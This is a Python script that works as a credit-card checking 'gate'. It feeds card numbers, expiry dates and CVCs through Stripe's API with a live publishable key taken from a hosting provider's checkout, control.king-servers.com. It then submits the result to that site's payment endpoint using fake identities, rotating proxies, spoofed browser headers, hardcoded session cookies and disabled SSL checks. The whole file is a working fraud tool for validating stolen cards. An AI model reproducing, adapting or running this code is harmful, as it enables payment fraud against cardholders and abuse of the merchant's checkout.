import requests
import re
import uuid
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from colorama import Fore, Style
from proxy import reqproxy
#$5.49
def fake_user():
   response = requests.get('https://randomuser.me/api/1.2/?nat=us')
   data = response.text
   name_match = re.search(r'"first":"(.*?)"', data)
   name = name_match.group(1) if name_match else ''
   last_match = re.search(r'"last":"(.*?)"', data)
   last = last_match.group(1) if last_match else ''
   email_match = re.search(r'"email":"(.*?)"', data)
   email = email_match.group(1) if email_match else ''
   street_match = re.search(r'"street":"(.*?)"', data)
   street = street_match.group(1) if street_match else ''
   city_match = re.search(r'"city":"(.*?)"', data)
   city = city_match.group(1) if city_match else ''
   state_match = re.search(r'"state":"(.*?)"', data)
   state = state_match.group(1) if state_match else ''
   phone_match = re.search(r'"phone":"(.*?)"', data)
   phone = phone_match.group(1) if phone_match else ''
   postcode_match = re.search(r'"postcode":(.*?),', data)
   postcode = postcode_match.group(1) if postcode_match else ''
   return name, last, email, street, city, state, phone, postcode

def Tele1(ccx):
    session, ip_address = reqproxy()
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")

    if "20" in yy:
        yy = yy.split("20")[1]
   
    name, last, email, street, city, state, phone, postcode = fake_user()
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not A(Brand";v="24", "Chromium";v="110"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': generate_user_agent(),
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=0ed3ead2-6862-4522-94cb-374f5f846bb57c7cef&muid=add7e35f-6875-4baf-b216-cfd13791b416541137&sid=ce847349-d4b1-47ef-a9f4-c07e8487a363df105e&payment_user_agent=stripe.js%2Fb06866a7a1%3B+stripe-js-v3%2Fb06866a7a1%3B+split-card-element&referrer=https%3A%2F%2Fcontrol.king-servers.com&time_on_page=22673&key=pk_live_51IE6fiGBIzJ3Q1SgUnKfVm53GVb5iL3ijwdMk7csvRZ7oYDt0ZOtqVTWcKk1lirPUFMtkauc0Y8dU0cQuw8FZyYX00b3HeHwEv'
  
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    try:
       id = response.json()['id']
       print(Fore.GREEN + "PM: ",id, "Proxy is Live: ", ip_address, "gatet1" + Style.RESET_ALL)
    except:
           return '#'


# Define the URL and headers
    url = 'https://control.king-servers.com/index.php?rp=/stripe/payment/intent'

    headers1 = {
       'authority': 'control.king-servers.com',
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
       'accept-language': 'en-US,en;q=0.9',
       'content-type': 'application/x-www-form-urlencoded',
       'origin': 'https://control.king-servers.com',
       'referer': 'https://control.king-servers.com/cart.php?a=checkout&e=false',
       'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    }
   
    data2 = {
    "account_id": "24471",
    "address1": "1622 3rd Ave",
    "address2": "",
    "applycredit": "0",
    "cccvv": "",
    "ccdescription": "",
    "ccexpirydate": "",
    "ccinfo": "new",
    "ccnumber": "",
    "city": "New York City",
    "companyname": "zaza",
    "country": "US",
    "country-calling-code-phonenumber": "1",
    "custtype": "existing",
    "email": "thih089@bugfoo.com",
    "firstname": "Robb",
    "lastname": "Koelpin I",
    "loginemail": "",
    "loginpassword": "",
    "notes": "",
    "payment_method_id": id,
    "paymentmethod": "stripe",
    "phonenumber": "212-876-7016",
    "postcode": "10128",
    "state": "New York",
    "submit": "true",
    "tax_id": "",
    "token": "1c736cb713c062c3134e6449fe95f35c47ae4139"
    }
  #  sid = str(uuid.uuid4())
    cookies = {
    "__stripe_mid": "add7e35f-6875-4baf-b216-cfd13791b416541137",
    "__stripe_sid": "e4d04297-da54-43f5-aefd-fc7f76a804ad291226",
    "cus": "thih089%40bugfoo.com",
    "WHMCSy551iLvnhYt7": "5ok559jtfnpd46ibmpo3onh7kb"
    }
    
  
   # Make the POST request
    response1 = session.post(url, headers=headers1, data=data2, cookies=cookies, verify=False)  # Note: Set verify=False to disable SSL verification
    try:
       result2 = response1.text
    except:
	    pass
    return result2
    
print("working gatet 1")
